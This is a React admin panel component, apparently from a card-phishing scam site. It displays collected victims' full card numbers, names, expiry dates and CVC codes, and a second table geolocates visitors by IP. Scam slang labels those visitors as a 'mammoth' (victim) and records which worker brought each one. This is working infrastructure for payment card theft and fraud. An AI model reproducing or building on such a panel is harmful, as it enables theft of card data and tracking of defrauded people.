import React, { useState, useEffect } from "react";
import "./admin.css";
import Pagination from "../Pagination/Pagination";
import Pagination2 from "../Pagination/Pagination2";
import AddCardForm from "../AddCardForm/AddCardForm";
import { useDispatch } from "react-redux";
import { useAuth } from "../../hooks/use-auth";
import {onAuthStateChanged, signOut} from "firebase/auth";
import {removeUser, setUser} from "../../store/slices/userSlice";
import { auth, db } from "../../firebase";
import { collection, addDoc, deleteDoc, query, onSnapshot, doc, getDocs } from 'firebase/firestore';
import ModalPay from "../Modals/ModalPay/ModalPay";
import Header from "../Header/header";
import IpifyAPI from "../../services/API/IpifyAPI";
import GeocodingAPI from "../../services/API/GeocodingAPI";

const AdminPanel = () => {
    const itemsCollection = collection(db, "items");
    const [items, setItems] = useState([]);
    const [currentPage, setCurrentPage] = useState(1);
    const [itemsPerPage, setItemsPerPage] = useState(3);

    const [items2, setItems2] = useState([]);
    const [currentPage2, setCurrentPage2] = useState(1);
    const [itemsPerPage2, setItemsPerPage2] = useState(3);
    const [infoUsers, setInfoUsers] = useState([]);
    const dispatch = useDispatch();

    const [currentPageInfo, setCurrentPageInfo] = useState(1);
    const [infoPerPage, setInfoPerPage] = useState(3);



    const paginate = (pageNumber) => setCurrentPage(pageNumber);


    const lastInfoIndex = currentPage2 * infoPerPage;
    const firstInfoIndex = lastInfoIndex - infoPerPage;
    const currentInfo = infoUsers.slice(firstInfoIndex, lastInfoIndex);

    const paginate2 = (pageNumber) => setCurrentPage2(pageNumber);



    const lastItemsIndex = currentPage * itemsPerPage;
    const firstItemsIndex = lastItemsIndex - itemsPerPage;
    const currentItems = items.slice(firstItemsIndex, lastItemsIndex);
    const infoUserCollection = collection(db, "infoUsers");
    const lastItemsIndex2 = currentPage2 * itemsPerPage2;
    const firstItemsIndex2 = lastItemsIndex2 - itemsPerPage2;
    const currentItems2 = items2.slice(firstItemsIndex2, lastItemsIndex2);

    const [location, setLocation] = useState({});

    let unsubscribe;

    useEffect(() => {
        const loadItems = async () => {
            const q = query(itemsCollection);
            unsubscribe = onSnapshot(q, (snapshot) => {
                const itemsData = [];
                snapshot.forEach((doc) => {
                    itemsData.push({ id: doc.id, ...doc.data() });
                });
                setItems(itemsData);
            });
        };
        loadItems();

        return () => unsubscribe();
    }, []);

    const handleAdd = async (newItem) => {
        try {
            const docRef = await addDoc(itemsCollection, newItem);
            const createdItem = { id: docRef.id, ...newItem };
            setItems((prevItems) => [...prevItems, createdItem]);
        } catch (error) {
            console.error(error);
        }
    };

    const handleRemove = async (id) => {
        try {
            await deleteDoc(doc(itemsCollection, id));
            setItems((prevItems) => prevItems.filter((item) => item.id !== id));
        } catch (error) {
            console.error(error);
        }
    };

    const handleRemove2 = async (id) => {
        try {
            await deleteDoc(doc(infoUserCollection, id));
            setItems2((prevItems) => prevItems.filter((item) => item.id !== id));
        } catch (error) {
            console.error(error);
        }
    };



    useEffect(() => {
        const loadInfoUsers = async () => {
            const q = query(infoUserCollection);
            unsubscribe = onSnapshot(q, (snapshot) => {
                const infoUserData = [];
                snapshot.forEach((doc) => {
                    infoUserData.push({ id: doc.id, ...doc.data() });
                });
                setInfoUsers(infoUserData);
            });
        };
        loadInfoUsers();

        return () => unsubscribe();
    }, []);


    return (
        <div className="Maintable">
            <Header />
            <div className="main _container">
                <div className="Table--block">
                    <div className="mainTable">
                        <div className="mainTable--title">
                            Страница Пополнений №{currentPage}
                        </div>
                        <div className="mainTable--Body">
                            {currentItems.map((item) => (
                                <div id={item.id} className="card" key={item.id}>
                                    <div className="formClose" onClick={() => handleRemove(item.id)}>
                                        <label htmlFor="X">X</label>
                                    </div>
                                    <p>ID: {item.id}</p>
                                    <p id="ItemInfo" className={item.id}>
                                        Сумма пополнения: {item.cardAmount}</p>
                                    <p id="ItemInfo" className={item.id}>
                                        Номер карты: {item.numberCard}
                                    </p>
                                    <p id="ItemInfo" className={item.id}>
                                        Имя и фамилия: {item.nameLastName}
                                    </p>
                                    <p>Срок действия: {item.cardValidity}/{item.cardValidity2}</p>
                                    <p>CVC: {item.cvv}</p>
                                </div>
                            ))}
                        </div>
                        <div className="mainTable--pagination">
                            <Pagination
                                itemsPerPage={itemsPerPage}
                                totalItems={items.length}
                                paginate={paginate}
                            />
                        </div>
                    </div>
                </div>
                <div className="Table--block">
                    <div className="mainTable">
                        <div className="mainTable--title">
                            Страница КТО завел человека №{currentPage2}
                        </div>
                        <div className="mainTable--Body--2">
                            {currentInfo.map((infoUser) => (
                                <div id={infoUser.id} className="card" key={infoUser.id}>
                                    <div>Инфа о залетном мамонте на сайт</div>
                                    <div className="formClose" onClick={() => handleRemove2(infoUser.id)}>
                                        <label htmlFor="X">X</label>
                                    </div>
                                    <p>ID: {infoUser.id}</p>
                                    <p>IP Address: {infoUser.ipAddress.ip}</p>
                                    <p>Страна: {infoUser.ipAddress.country}</p>
                                    <p>Регион: {infoUser.ipAddress.region}</p>
                                    <p>Город: {infoUser.ipAddress.city}</p>
                                    <h2>Кто привёл:{infoUser.path} </h2>
                                </div>
                            ))}
                        </div>
                        <div className="mainTable--pagination">
                            <Pagination2
                                itemsPerPage2={infoPerPage}
                                totalItems2={infoUsers.length}
                                paginate2={paginate2}
                            />
                        </div>

                    </div>
                </div>
            </div>
        </div>
    );
}

export default AdminPanel;
